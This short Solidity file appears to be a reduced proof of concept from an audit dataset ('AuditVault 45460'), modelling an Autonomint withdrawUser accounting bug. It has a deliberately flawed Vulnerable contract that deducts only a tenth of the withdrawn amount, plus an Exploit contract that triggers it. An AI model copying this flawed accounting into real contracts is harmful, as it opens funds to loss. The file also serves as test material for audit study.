// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 45460: Autonomint withdrawUser deduction. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public totalCdsDepositedAmount = 100; function withdrawUser(uint256 amount) external { totalCdsDepositedAmount -= amount / 10; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.withdrawUser(10); success = bug.totalCdsDepositedAmount() == 99;
    }
}


